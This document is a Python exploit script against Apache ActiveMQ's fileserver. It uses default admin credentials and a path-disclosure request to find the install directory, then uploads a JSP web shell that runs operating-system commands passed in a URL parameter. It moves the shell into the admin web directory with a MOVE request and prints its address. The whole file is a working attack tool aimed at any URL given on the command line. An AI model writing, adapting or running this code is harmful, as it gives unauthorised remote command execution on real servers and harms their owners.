#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author:gshell

import requests
import os
import sys
import re

headers = {
    "Authorization": "Basic YWRtaW46YWRtaW4=",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded"
    }

def check(url):
    url1 = url + "/fileserver/a../../%08/..%08/.%08/%08"
    try:
        r1 = requests.put(url=url1,headers=headers, allow_redirects=False, timeout=5)
        if r1.status_code == 500:
            path = re.findall(r"(.*)fileserver",r1.reason)[0]
            print('ActiveMQ_put_path：'+path)
            #print('{}：put ok'.format(url))
            url2 = url + "/fileserver/guo.txt"
            payload = '''<%
    if("gshell".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("shell")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
''' 
            r2 = requests.put(url=url2,headers=headers, data=payload, allow_redirects=False, timeout=5)
            if r2.status_code == 204:
                print("ActiveMQ_put__txt：{}".format(url2))
                
                headers_move = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate", "Authorization": "Basic YWRtaW46YWRtaW4=",
    "Destination": "file://"+path+"admin/guo.jsp",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "max-age=0"}
                r3 = requests.request('MOVE', url=url2, headers=headers_move, allow_redirects=False, timeout=5)
                # print(r3.status_code)
                if r3.status_code == 204:
                    print("ActiveMQ_putshell：{}".format(url+'/admin/guo.jsp'))
            else:
                pass
    except:
        pass

if __name__ == '__main__':
    print('''
  ____                       _            _  _ 
 |  _ \                     | |          | || |
 | |_) | _   _    __ _  ___ | |__    ___ | || |
 |  _ < | | | |  / _` |/ __|| '_ \  / _ \| || |
 | |_) || |_| | | (_| |\__ \| | | ||  __/| || |
 |____/  \__, |  \__, ||___/|_| |_| \___||_||_|
          __/ |   __/ |                        
         |___/   |___/
        ''')

    argvs = sys.argv
    if len(argvs) < 2:
        print('''usage:python ActiveMQ_putshell.py -u url''')
        os._exit(0)

    if "-u" in argvs:
        check(argvs[2])
        
